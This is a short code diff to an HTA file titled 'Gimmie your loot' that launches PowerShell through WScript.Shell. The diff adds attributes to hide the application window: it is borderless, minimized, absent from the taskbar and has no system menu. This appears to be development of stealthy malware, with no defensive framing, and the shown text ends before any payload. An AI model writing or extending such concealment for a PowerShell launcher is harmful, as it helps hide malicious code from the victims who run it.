@@ -5,6 +5,12 @@
     <HTA:APPLICATION 
         ID="test"
         APPLICATIONNAME="Gimmie your loot"
+        BORDER="no"       <!-- Remove the border -->
+        SCROLL="no"       <!-- Disable scrolling -->
+        SINGLEINSTANCE="yes"
+        SYSMENU="no"      <!-- Remove system menu -->
+        SHOWINTASKBAR="no" <!-- Hide from taskbar -->
+        WINDOWSTATE="minimized" <!-- Start minimized -->
     <script type="text/javascript">
         function runPowerShell() {
             var objShell = new ActiveXObject("WScript.Shell");
